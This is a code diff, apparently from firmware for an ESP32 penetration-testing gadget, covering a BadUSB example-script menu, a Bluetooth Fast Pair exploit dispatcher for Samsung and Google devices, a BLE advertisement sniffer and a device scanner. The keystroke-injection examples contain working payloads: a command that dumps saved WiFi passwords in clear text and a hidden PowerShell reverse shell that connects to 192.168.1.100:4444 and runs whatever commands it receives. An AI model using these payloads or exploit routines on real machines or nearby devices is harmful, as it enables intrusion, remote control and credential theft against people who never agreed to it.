-                if (scriptIdx == selected) {
-                    tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
-                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
-                    tft.setCursor(25, yPos + 8);
-                    tft.print("> ");
-                } else {
-                    tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
-                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-                    tft.setCursor(25, yPos + 8);
-                    tft.print("  ");
-                }
-
-                String displayName = scripts[scriptIdx];
-                if (displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
-                tft.print(displayName);
-            }
-
-            if (scriptCount > maxVisibleItems) {
-                tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
-                tft.setCursor(tftWidth - 25, menuStartY + 5);
-                if (scrollOffset > 0) tft.print("^");
-                tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
-                if (scrollOffset + maxVisibleItems < scriptCount) tft.print("v");
-            }
-
-            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-            tft.setCursor(20, tftHeight - 35);
-            tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
-            lastSelected = selected;
-            lastScrollOffset = scrollOffset;
-        }
-
-        if (check(EscPress)) {
-            delay(200);
-            exitMenu = true;
-            return "";
-        } else if (check(PrevPress)) {
-            delay(150);
-            if (selected > 0) {
-                selected--;
-                if (selected < scrollOffset) scrollOffset = selected;
-            } else {
-                selected = scriptCount - 1;
-                scrollOffset = std::max(0, scriptCount - maxVisibleItems);
-            }
-        } else if (check(NextPress)) {
-            delay(150);
-            if (selected < scriptCount - 1) {
-                selected++;
-                if (selected >= scrollOffset + maxVisibleItems) scrollOffset = selected - maxVisibleItems + 1;
-            } else {
-                selected = 0;
-                scrollOffset = 0;
-            }
-        } else if (check(SelPress)) {
-            delay(200);
-
-            if (selected == scriptCount - 1) return "";
-            else if (scripts[selected] == "Load from SD") {
-                String filename = selectFileFromSD();
-                if (!filename.isEmpty() && loadScriptFromSD(filename)) return globalScript;
-                return "";
-            } else if (scripts[selected].startsWith("Example: ")) {
-                String scriptName = scripts[selected].substring(9);
-                if (scriptName == "Open Calculator") {
-                    return "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER";
-                } else if (scriptName == "Open CMD/Terminal") {
-                    return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
-                } else if (scriptName == "WiFi Credentials") {
-                    return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan "
-                           "show profile name=* key=clear\nDELAY 300\nENTER";
-                } else if (scriptName == "Reverse Shell") {
-                    return "GUI r\nDELAY 500\nSTRING powershell -w h -NoP -NonI -Exec Bypass $client = "
-                           "New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = "
-                           "$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = "
-                           "$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName "
-                           "System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | "
-                           "Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = "
-                           "([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$"
-                           "sendbyte.Length);$stream.Flush()};$client.Close()\nENTER";
-                } else if (scriptName == "Rickroll") {
-                    return "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY "
-                           "300\nENTER";
-                }
-            }
-        }
-        delay(50);
+    String scriptName = scripts[chosen].startsWith("Example: ") ? scripts[chosen].substring(9) : "";
+    if (scriptName == "Open Calculator") {
+        return "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER";
+    } else if (scriptName == "Open CMD/Terminal") {
+        return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
+    } else if (scriptName == "WiFi Credentials") {
+        return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan "
+               "show profile name=* key=clear\nDELAY 300\nENTER";
+    } else if (scriptName == "Reverse Shell") {
+        return "GUI r\nDELAY 500\nSTRING powershell -w h -NoP -NonI -Exec Bypass $client = "
+               "New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = "
+               "$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = "
+               "$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName "
+               "System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | "
+               "Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = "
+               "([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$"
+               "sendbyte.Length);$stream.Flush()};$client.Close()\nENTER";
+    } else if (scriptName == "Rickroll") {
+        return "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY "
+               "300\nENTER";
     }
     return "";
 }
 
 //=============================================================================
-// FastPair Engine Implementation
+// FastPair Exploit Engine
 //=============================================================================
+
+bool FastPairExploitEngine::smartExploit(NimBLEAddress target) {
+    if (isSamsungDevice(target)) {
+        return exploitSamsungFastPair(target);
+    } else {
+        return exploitGoogleFastPair(target);
+    }
+}
+
+bool FastPairExploitEngine::exploitSamsungFastPair(NimBLEAddress target) {
+    return exploitFastPairConnection(target, FP_EXPLOIT_ALL);
+}
+
+bool FastPairExploitEngine::exploitGoogleFastPair(NimBLEAddress target) {
+    return exploitFastPairConnection(target, FP_EXPLOIT_ALL);
+}
 
 std::vector<FastPairDeviceInfo> FastPairExploitEngine::scanForFastPairDevices(int duration) {
     discoveredDevices.clear();
@@ -3083,12 +3310,11 @@ std::vector<FastPairDeviceInfo> FastPairExploitEngine::scanForFastPairDevices(in
     pScan->setActiveScan(true);
     pScan->setInterval(97);
     pScan->setWindow(67);
-    pScan->start(duration, false);
 
-    NimBLEScanResults results = pScan->getResults();
+    NimBLEScanResults results = pScan->getResults(duration * 1000, false);
+
     for (int i = 0; i < results.getCount(); i++) {
         const NimBLEAdvertisedDevice *device = results.getDevice(i);
-
         String address = String(device->getAddress().toString().c_str());
         String name = device->getName().c_str();
         int rssi = device->getRSSI();
@@ -3119,6 +3345,8 @@ std::vector<FastPairDeviceInfo> FastPairExploitEngine::scanForFastPairDevices(in
             info.connected = false;
             info.modelId = modelId;
             info.deviceType = getDeviceTypeFromModelId(modelId);
+
+            if (isSamsungDevice(info.address)) { info.deviceType += " (Samsung)"; }
 
             discoveredDevices.push_back(info);
             showAttackProgress(
@@ -3593,338 +3821,1008 @@ void FastPairExploitEngine::generateRandomMac(uint8_t *mac) {
 }
 
 //=============================================================================
-// Scanner
+// v3.1: BLE Sniffer - FIXED: Always init
+//=============================================================================
+
+struct SnifferPacket {
+    String address;
+    String name;
+    int rssi;
+    std::vector<uint8_t> payload;
+    String payloadHex;
+    String timestamp;
+    int channel;
+};
+
+static std::vector<SnifferPacket> snifferPackets;
+static bool snifferRunning = false;
+static int snifferPacketCount = 0;
+
+static String payloadToHex(const std::vector<uint8_t> &payload) {
+    String hex = "";
+    for (size_t i = 0; i < payload.size(); i++) {
+        if (payload[i] < 0x10) hex += "0";
+        hex += String(payload[i], HEX);
+        if (i < payload.size() - 1) hex += " ";
+        if ((i + 1) % 16 == 0 && i < payload.size() - 1) hex += "\n";
+    }
+    return hex;
+}
+
+static String parseManufacturerData(const std::vector<uint8_t> &payload) {
+    if (payload.size() < 2) return "Unknown";
+
+    uint16_t companyId = (payload[1] << 8) | payload[0];
+    String info = "Company: 0x" + String(companyId, HEX) + " ";
+
+    switch (companyId) {
+        case 0x004C: info += "(Apple)"; break;
+        case 0x0075: info += "(Samsung)"; break;
+        case 0xFE2C: info += "(Google FastPair)"; break;
+        case 0x0600: info += "(Microsoft)"; break;
+        case 0x0006: info += "(Microsoft)"; break;
+        case 0x0045: info += "(Nintendo)"; break;
+        case 0x000A: info += "(CSR)"; break;
+        case 0x0010: info += "(Broadcom)"; break;
+        case 0x0011: info += "(Marvell)"; break;
+        case 0x0012: info += "(TI)"; break;
+        case 0x0014: info += "(Infineon)"; break;
+        case 0x0015: info += "(STMicro)"; break;
+        case 0x0016: info += "(Renesas)"; break;
+        case 0x0019: info += "(Nordic)"; break;
+        case 0x0022: info += "(Dialog)"; break;
+        default: info += "(Unknown)";
+    }
+
+    if (payload.size() >= 4) {
+        if (companyId == 0x004C) {
+            uint8_t type = payload[2];
+            uint8_t subtype = payload[3];
+            if (type == 0x07 && subtype == 0x19) info += " Continuity";
+            else if (type == 0x04 && subtype == 0x04) info += " Continuity Action";
+            else if (type == 0x0F && subtype == 0x05) info += " Nearby Action";
+            else if (type == 0x10 && subtype == 0x14) info += " iBeacon";
+        } else if (companyId == 0x0075) {
+            if (payload[2] == 0x42 && payload[3] == 0x09) info += " Galaxy Buds";
+            else if (payload[2] == 0x01 && payload[3] == 0x00) info += " Galaxy Watch";
+        } else if (companyId == 0xFE2C && payload.size() >= 7) {
+            uint32_t modelId = (payload[4] << 16) | (payload[5] << 8) | payload[6];
+            info += " Model: 0x" + String(modelId, HEX);
+            for (int i = 0; fastpair_models[i].name != nullptr; i++) {
+                if (fastpair_models[i].modelId == modelId) {
+                    info += " (" + String(fastpair_models[i].name) + ")";
+                    break;
+                }
+            }
+        }
+    }
+    return info;
+}
+
+void BLE_Sniffer() {
+    // FIX: Always init - handles case where stack was deinit'd by another module
+    BLEStateManager::initBLE("BruceSniffer", ESP_PWR_LVL_P9);
+    NimBLEScan *pScan = nullptr;
+    bool firstRun = true;
+    bool redraw = true;
+
+    while (true) {
+        if (redraw) {
+            drawMainBorderWithTitle("BLE SNIFFER");
+            padprintln("");
+            padprintln("Press [SEL] to start/stop capture");
+            padprintln("Press [ESC] to exit");
+            padprintln("");
+            padprintln("Status: READY");
+            redraw = false;
+        }
+        if (check(EscPress)) {
+            if (pScan) {
+                pScan->stop();
+                pScan->clearResults();
+                pScan = nullptr;
+            }
+            break;
+        }
+
+        bool isSelPressed = check(SelPress);
+        if (isSelPressed && snifferPacketCount == 0) {
+            if (firstRun) {
+                BLEStateManager::initBLE("BruceSniffer", ESP_PWR_LVL_P9);
+                pScan = NimBLEDevice::getScan();
+                if (!pScan) {
+                    displayError("Failed to init scanner");
+                    return;
+                }
+                pScan->setActiveScan(true);
+                pScan->setInterval(97);
+                pScan->setWindow(67);
+                pScan->setDuplicateFilter(false);
+                firstRun = false;
+            }
+            snifferPacketCount = 0;
+            snifferPackets.clear();
+
+            padprintln("Status: CAPTURING...");
+
+            NimBLEScanResults results = pScan->getResults(10 * 1000, true);
+
+            for (int i = 0; i < results.getCount(); i++) {
+                const NimBLEAdvertisedDevice *device = results.getDevice(i);
+                SnifferPacket packet;
+                packet.address = String(device->getAddress().toString().c_str());
+                packet.name = String(device->getName().c_str());
+                if (packet.name.isEmpty()) packet.name = "Unknown";
+                packet.rssi = device->getRSSI();
+                packet.timestamp = String(millis() / 1000);
+
+                std::string manufData = device->getManufacturerData();
+                packet.payload.assign(manufData.begin(), manufData.end());
+                packet.payloadHex = payloadToHex(packet.payload);
+                packet.channel = 37 + (i % 3);
+
+                snifferPackets.push_back(packet);
+                snifferPacketCount++;
+            }
+
+            pScan->stop();
+            drawMainBorderWithTitle("BLE SNIFFER");
+            padprintln("");
+            padprintln("Status: DONE");
+            padprintln("Captured: " + String(snifferPacketCount) + " packets");
+            padprintln("");
+            padprintln("[SEL]  - view packets");
+            padprintln("[NEXT] - save to SD/LittleFS");
+            padprintln("[ESC]  - exit");
+        }
+
+        if (isSelPressed && snifferPacketCount > 0) {
+            int selected = 0;
+            int scrollOffset = 0;
+            bool viewing = true;
+
+            while (viewing) {
+                int y = BORDER_PAD_Y + FM * LH + 4;
+                const int lineH = max(14, tftHeight / 12);
+                const int visibleItems = (tftHeight - y - 50) / lineH;
+                if (check(EscPress)) {
+                    viewing = false;
+                    redraw = true; // main screen
+                    break;
+                }
+
+                if (redraw) {
+                    tft.fillScreen(bruceConfig.bgColor);
+                    drawMainBorderWithTitle("CAPTURED PACKETS");
+
+                    tft.setTextSize(FP);
+                    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+                    tft.setCursor(10, y);
+                    tft.println("Packets: " + String(snifferPacketCount));
+                    y += lineH;
+
+                    for (int i = 0; i < visibleItems && (scrollOffset + i) < snifferPacketCount && i < 5;
+                         i++) {
+                        int idx = scrollOffset + i;
+                        SnifferPacket &pkt = snifferPackets[idx];
+                        bool selectedItem = (idx == selected);
+                        uint16_t fg = selectedItem ? bruceConfig.bgColor : TFT_WHITE;
+                        uint16_t bg = selectedItem ? bruceConfig.priColor : bruceConfig.bgColor;
+
+                        tft.fillRect(10, y, tftWidth - 20, lineH - 2, bg);
+                        tft.setTextColor(fg, bg);
+                        String display = String(idx + 1) + ". " + pkt.name + " | " + pkt.address + " | " +
+                                         String(pkt.rssi) + "dB";
+                        if (display.length() > 35) display = display.substring(0, 32) + "...";
+                        tft.drawString(display, 15, y + 2, 1);
+                        y += lineH;
+                    }
+
+                    if (snifferPacketCount > visibleItems) {
+                        tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+                        tft.setCursor(tftWidth - 30, BORDER_PAD_Y + FM * LH + 4 + lineH);
+                        if (scrollOffset > 0)
+                            tft.drawString("^", tftWidth - 25, BORDER_PAD_Y + FM * LH + 4 + lineH, 1);
+                        if (scrollOffset + visibleItems < snifferPacketCount) {
+                            tft.drawString(
+                                "v", tftWidth - 25, BORDER_PAD_Y + FM * LH + 4 + lineH * (visibleItems - 1), 1
+                            );
+                        }
+                    }
+
+                    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
+                    tft.setCursor(10, tftHeight - 20);
+                    tft.drawString(
+                        "PREV/NEXT: Navigate  SEL: View Details  ESC: Back", 10, tftHeight - 20, 1
+                    );
+                    redraw = false; // view screen
+                    TouchFooter();
+                }
+
+                if (check(NextPress)) {
+                    if (selected < snifferPacketCount - 1) {
+                        selected++;
+                        if (selected >= scrollOffset + visibleItems) {
+                            scrollOffset = selected - visibleItems + 1;
+                        }
+                    }
+                    redraw = true; // view screen
+                }
+                if (check(PrevPress)) {
+                    if (selected > 0) {
+                        selected--;
+                        if (selected < scrollOffset) { scrollOffset = selected; }
+                    }
+                    redraw = true; // view screen
+                }
+                if (check(SelPress)) {
+                    SnifferPacket &pkt = snifferPackets[selected];
+
+                    drawMainBorderWithTitle("PACKET DETAILS");
+                    int dy = BORDER_PAD_Y + FM * LH + 4;
+                    int dlh = max(12, tftHeight / 14);
+                    tft.setTextSize(FP);
+                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+
+                    tft.setCursor(10, dy);
+                    tft.println("Device: " + pkt.name);
+                    dy += dlh;
+                    tft.println("Address: " + pkt.address);
+                    dy += dlh;
+                    tft.println("RSSI: " + String(pkt.rssi) + " dBm");
+                    dy += dlh;
+                    tft.println("Channel: " + String(pkt.channel));
+                    dy += dlh;
+                    tft.println("Timestamp: " + pkt.timestamp + "s");
+                    dy += dlh;
+                    tft.println("Payload (" + String(pkt.payload.size()) + " bytes):");
+                    dy += dlh;
+
+                    String parsed = parseManufacturerData(pkt.payload);
+                    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+                    tft.println(parsed);
+                    dy += dlh;
+
+                    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+                    String hexDump = pkt.payloadHex;
+                    if (hexDump.length() > 400) hexDump = hexDump.substring(0, 400) + "...\n(truncated)";
+                    tft.println(hexDump);
+
+                    tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
+                    tft.setCursor(10, tftHeight - 20);
+                    tft.drawString("Press any key to continue", 10, tftHeight - 20, 1);
+
+                    while (!check(EscPress) && !check(SelPress) && !check(PrevPress) && !check(NextPress)) {
+                        delay(50);
+                    }
+                    redraw = true; // view screen
+                }
+                delay(100);
+            }
+            redraw = true; // main screen
+        }
+
+        if (check(NextPress) && snifferPacketCount > 0) {
+            FS *fs = nullptr;
+            String storageType = "";
+
+            if (getFsStorage(fs) && fs == &SD) {
+                storageType = "SD";
+            } else if (setupLittleFS()) {
+                fs = &LittleFS;
+                storageType = "LittleFS";
+            }
+
+            if (fs && !storageType.isEmpty()) {
+                if (!fs->exists("/BruceSniffer")) fs->mkdir("/BruceSniffer");
+
+                String filename = "/BruceSniffer/sniffer_" + String(millis()) + ".txt";
+                File file = fs->open(filename, FILE_WRITE);
+                if (file) {
+                    file.println("=== BLE SNIFFER CAPTURE ===");
+                    file.println("Timestamp: " + String(millis()));
+                    file.println("Total packets: " + String(snifferPacketCount));
+                    file.println("");
+
+                    for (size_t i = 0; i < snifferPackets.size(); i++) {
+                        SnifferPacket &pkt = snifferPackets[i];
+                        file.printf(
+                            "[%d] %s | %s | %d dBm | Ch:%d\n",
+                            i + 1,
+                            pkt.name.c_str(),
+                            pkt.address.c_str(),
+                            pkt.rssi,
+                            pkt.channel
+                        );
+                        file.print("  Payload: ");
+                        for (size_t j = 0; j < pkt.payload.size(); j++) {
+                            file.printf("%02X ", pkt.payload[j]);
+                            if ((j + 1) % 16 == 0) file.print("\n  ");
+                        }
+                        file.println("\n");
+                    }
+                    file.close();
+                    displaySuccess("Saved to " + storageType);
+                } else {
+                    displayError("Failed to save");
+                }
+            } else {
+                displayError("No storage available");
+            }
+            delay(1000);
+            redraw = true; // main screen
+        }
+
+        delay(100);
+    }
+}
+
+//=============================================================================
+// Target Selection Functions
 //=============================================================================
 
 String selectTargetFromScan(const char *title) {
-    scannerData.clear();
-
-    tft.fillScreen(bruceConfig.bgColor);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth(title)) / 2, 15);
-    tft.print(title);
-    tft.setTextSize(1);
-
-    tft.setCursor(20, 60);
-    tft.print("Initializing BLE...");
-
-    if (isBLEInitialized()) {
-        BLEStateManager::deinitBLE(true);
-        delay(500);
+    // Simple memory check - if heap is low, warn but continue
+    if (heap_caps_get_free_size(MALLOC_CAP_DEFAULT) < 10000) {
+        displayError("Low memory, scan may be unstable", true);
+        // Don't return - let the user decide
     }
 
-    NimBLEDevice::init("Bruce-Scanner");
-    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    // DO NOT clear scannerData here - it persists between operations
+    g_selectedDevice.address = "";
+    g_selectedDevice.name = "";
 
-    NimBLEScan *pBLEScan = NimBLEDevice::getScan();
-    if (!pBLEScan) {
-        tft.fillScreen(TFT_RED);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-        tft.setTextColor(TFT_WHITE, TFT_RED);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("ERROR")) / 2, 15);
-        tft.print("ERROR");
-        tft.setTextSize(1);
-        tft.setCursor(20, 60);
-        tft.print("Failed to create BLE scanner!");
-        delay(2000);
+    bool bleWasActiveBefore = BLEConnected || (BLEDevice::getServer() != nullptr);
+#if !defined(LITE_VERSION)
+    bleWasActiveBefore =
+        bleWasActiveBefore || BLEStateManager::isBLEActive() || BLEStateManager::getActiveClientCount() > 0;
+#endif
+
+    // FIX: Always call initBLE - it handles the case where stack was deinit'd
+    if (!BLEStateManager::initBLE("Bruce-Scanner", ESP_PWR_LVL_P9)) {
+        displayError("Failed to init BLE");
         return "";
     }
 
-    pBLEScan->setActiveScan(true);
-    pBLEScan->setInterval(97);
-    pBLEScan->setWindow(67);
-    pBLEScan->setDuplicateFilter(false);
-
-    tft.setCursor(20, 100);
-    tft.print("Scanning for devices...");
-
-    const int ACTIVE_SCAN_TIME = 15, PASSIVE_SCAN_TIME = 15;
-
-    tft.setCursor(20, 120);
-    tft.print("Active scan (15s)...");
-
-#ifdef NIMBLE_V2_PLUS
-    NimBLEScanResults results = pBLEScan->getResults(ACTIVE_SCAN_TIME * 1000, false);
-#else
-    NimBLEScanResults results = pBLEScan->start(ACTIVE_SCAN_TIME, false);
-#endif
-
-    tft.setCursor(20, 140);
-    tft.print("Passive scan (15s)...");
-    pBLEScan->setActiveScan(false);
-
-#ifdef NIMBLE_V2_PLUS
-    results = pBLEScan->getResults(PASSIVE_SCAN_TIME * 1000, false);
-#else
-    results = pBLEScan->start(PASSIVE_SCAN_TIME, false);
-#endif
-
-    if (results.getCount() == 0) {
-        pBLEScan->stop();
-        BLEStateManager::deinitBLE(true);
-
-        tft.fillScreen(TFT_YELLOW);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-        tft.setTextColor(TFT_BLACK, TFT_YELLOW);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("NO DEVICES")) / 2, 15);
-        tft.print("NO DEVICES");
-        tft.setTextSize(1);
-        tft.setCursor(20, 60);
-        tft.print("No BLE devices found!");
-        tft.setCursor(20, 80);
-        tft.print("Make sure BLE devices are");
-        tft.setCursor(20, 100);
-        tft.print("turned on and in range.");
-        tft.setCursor(20, 130);
-        tft.print("Devices found: 0");
-        delay(2000);
-        return "";
+    if (g_pBLEScan == nullptr) {
+        g_pBLEScan = NimBLEDevice::getScan();
+        if (!g_pBLEScan) {
+            displayError("Failed to get scanner");
+            return "";
+        }
+        g_pBLEScan->setActiveScan(true);
+        g_pBLEScan->setInterval(SCAN_INT);
+        g_pBLEScan->setWindow(SCAN_WINDOW);
+        g_pBLEScan->setDuplicateFilter(false);
     }
 
-    for (int i = 0; i < results.getCount(); i++) {
-        const NimBLEAdvertisedDevice *device = results.getDevice(i);
+    // Clear previous results before scanning
+    g_pBLEScan->clearResults();
 
-        String address = String(device->getAddress().toString().c_str());
-        String name = String(device->getName().c_str());
-        if (name.isEmpty() || name == "(null)" || name == "null" || name == "NULL") name = "Unknown";
+    BleUiGeom sg = bleUiGeom();
+    drawMainBorderWithTitle(title);
+    tft.setTextSize(FP);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.drawString("Scanning for devices...", sg.listL, sg.top, 1);
 
-        int rssi = device->getRSSI();
-        if (rssi == 0) rssi = -100;
+    int activeScanTime = ACTIVE_SCAN_TIME;
+    int passiveScanTime = PASSIVE_SCAN_TIME;
 
-        bool fastPair = false, hasHFP = false;
-        uint8_t deviceType = 0;
+    if (heap_caps_get_free_size(MALLOC_CAP_DEFAULT) < 15000) {
+        activeScanTime = 3;
+        passiveScanTime = 3;
+    }
 
-        if (device->haveServiceUUID()) {
-            NimBLEUUID uuid = device->getServiceUUID();
-            std::string uuidStr = uuid.toString();
-            if (uuidStr.find("fe2c") != std::string::npos) fastPair = true;
-            if (uuidStr.find("111e") != std::string::npos || uuidStr.find("111f") != std::string::npos)
-                hasHFP = true;
-            if (uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos)
-                deviceType |= 0x01;
-            if (uuidStr.find("1812") != std::string::npos) deviceType |= 0x02;
+    // === ACTIVE SCAN ===
+    g_pBLEScan->setActiveScan(true);
+    tft.setTextColor(bleDim(), bruceConfig.bgColor);
+    tft.drawString("Active scan (" + String(activeScanTime) + "s)...", sg.listL, sg.top + sg.rowH, 1);
+
+    try {
+        BLEScanResults activeResults = g_pBLEScan->getResults(activeScanTime * 1000, false);
+        for (int i = 0; i < activeResults.getCount(); i++) {
+            const NimBLEAdvertisedDevice *device = activeResults.getDevice(i);
+            if (!device) continue;
+
+            String address = String(device->getAddress().toString().c_str());
+            String name = String(device->getName().c_str());
+            if (name.isEmpty() || name == "(null)" || name == "null" || name == "NULL") {
+                // name = "Unknown";
+                name = address;
+            }
+            int rssi = device->getRSSI();
+            if (rssi == 0) rssi = -100;
+
+            bool fastPair = false, hasHFP = false;
+            uint8_t deviceType = 0;
+
+            if (device->haveServiceUUID()) {
+                NimBLEUUID uuid = device->getServiceUUID();
+                std::string uuidStr = uuid.toString();
+                if (uuidStr.find("fe2c") != std::string::npos) fastPair = true;
+                if (uuidStr.find("111e") != std::string::npos || uuidStr.find("111f") != std::string::npos)
+                    hasHFP = true;
+                if (uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos)
+                    deviceType |= 0x01;
+                if (uuidStr.find("1812") != std::string::npos) deviceType |= 0x02;
+            }
+
+            scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType);
         }
 
-        scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType);
+        // === PASSIVE SCAN ===
+        g_pBLEScan->setActiveScan(false);
+        tft.setTextColor(bleDim(), bruceConfig.bgColor);
+        tft.drawString(
+            "Passive scan (" + String(passiveScanTime) + "s)...", sg.listL, sg.top + 2 * sg.rowH, 1
+        );
+
+        BLEScanResults passiveResults = g_pBLEScan->getResults(passiveScanTime * 1000, false);
+
+        for (int i = 0; i < passiveResults.getCount(); i++) {
+            const NimBLEAdvertisedDevice *device = passiveResults.getDevice(i);
+            if (!device) continue;
+
+            String address = String(device->getAddress().toString().c_str());
+            String name = String(device->getName().c_str());
+            if (name.isEmpty() || name == "(null)" || name == "null" || name == "NULL") {
+                // name = "Unknown";
+                name = address;
+            }
+            int rssi = device->getRSSI();
+            if (rssi == 0) rssi = -100;
+
+            bool fastPair = false, hasHFP = false;
+            uint8_t deviceType = 0;
+
+            if (device->haveServiceUUID()) {
+                NimBLEUUID uuid = device->getServiceUUID();
+                std::string uuidStr = uuid.toString();
+                if (uuidStr.find("fe2c") != std::string::npos) fastPair = true;
+                if (uuidStr.find("111e") != std::string::npos || uuidStr.find("111f") != std::string::npos)
+                    hasHFP = true;
+                if (uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos)
+                    deviceType |= 0x01;
+                if (uuidStr.find("1812") != std::string::npos) deviceType |= 0x02;
+            }
+
+            scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType);
+        }
+    } catch (...) {
+        displayError("BLE scan error");
+        if (g_pBLEScan) { g_pBLEScan->clearResults(); }
+        return "";
     }
 
-    pBLEScan->stop();
-    pBLEScan->clearResults();
-    BLEStateManager::deinitBLE(true);
+    if (g_pBLEScan) {
+        g_pBLEScan->stop();
+        g_bleScanActive = false;
+    }
 
-    size_t deviceCount = scannerData.size();
+    DeviceSnapshot *snapshot = scannerData.getSnapshot();
+    if (!snapshot || snapshot->count == 0) {
+        displayWarning("No BLE devices in range", true);
+        return "";
+    }
 
-    if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-        for (size_t i = 0; i < scannerData.deviceAddresses.size() - 1; i++) {
-            for (size_t j = i + 1; j < scannerData.deviceAddresses.size(); j++) {
-                bool swapNeeded = false;
-                if (scannerData.deviceFastPair[j] && !scannerData.deviceFastPair[i]) swapNeeded = true;
-                else if (scannerData.deviceFastPair[j] == scannerData.deviceFastPair[i] &&
-                         scannerData.deviceRssi[j] > scannerData.deviceRssi[i])
-                    swapNeeded = true;
+    // size_t deviceCount = snapshot->count;
+    size_t deviceCount = scannerData.deviceAddresses.size();
 
-                if (swapNeeded) {
-                    std::swap(scannerData.deviceNames[i], scannerData.deviceNames[j]);
-                    std::swap(scannerData.deviceAddresses[i], scannerData.deviceAddresses[j]);
-                    std::swap(scannerData.deviceRssi[i], scannerData.deviceRssi[j]);
+    for (size_t i = 0; i < deviceCount - 1; i++) {
+        for (size_t j = i + 1; j < deviceCount; j++) {
+            bool swapNeeded = false;
+            if (snapshot->fastPair[j] && !snapshot->fastPair[i]) swapNeeded = true;
+            else if (snapshot->fastPair[j] == snapshot->fastPair[i] && snapshot->rssi[j] > snapshot->rssi[i])
+                swapNeeded = true;
 
-                    bool tempFastPair = scannerData.deviceFastPair[i];
-                    scannerData.deviceFastPair[i] = scannerData.deviceFastPair[j];
-                    scannerData.deviceFastPair[j] = tempFastPair;
+            if (swapNeeded) {
+                std::swap(snapshot->names[i], snapshot->names[j]);
+                std::swap(snapshot->addresses[i], snapshot->addresses[j]);
+                std::swap(snapshot->rssi[i], snapshot->rssi[j]);
 
-                    bool tempHFP = scannerData.deviceHasHFP[i];
-                    scannerData.deviceHasHFP[i] = scannerData.deviceHasHFP[j];
-                    scannerData.deviceHasHFP[j] = tempHFP;
-                    std::swap(scannerData.deviceTypes[i], scannerData.deviceTypes[j]);
-                }
+                bool tempFast = snapshot->fastPair[i];
+                snapshot->fastPair[i] = snapshot->fastPair[j];
+                snapshot->fastPair[j] = tempFast;
+
+                bool tempHfp = snapshot->hfp[i];
+                snapshot->hfp[i] = snapshot->hfp[j];
+                snapshot->hfp[j] = tempHfp;
+
+                std::swap(snapshot->types[i], snapshot->types[j]);
             }
         }
-        xSemaphoreGive(scannerData.mutex);
     }
 
-    int maxVisibleDevices = 3, deviceItemHeight = 30, menuStartY = 60;
-    int selectedIdx = 0, scrollOffset = 0;
-    int lastSelected = -1, lastScrollOffset = -1;
+    // One row per device: ordinal, name, MAC tail, capability tags and a signal
+    // meter. Tags reserve their width before the name is measured, so a long
+    // name can no longer push the vulnerability markers off screen.
+    BleRowDrawer deviceRow = [snapshot](int idx, int x, int y, int w, bool sel) {
+        uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
+        uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
+        uint16_t dim = sel ? bruceConfig.bgColor : bleDim();
+        const int cw = FP * LW;
+        tft.setTextSize(FP);
+
+        // the ordinal is the ID the list never had
+        tft.setTextColor(fg, bg);
+        tft.drawString(String(idx + 1), x, y, 1);
+        int cur = x + 3 * cw;
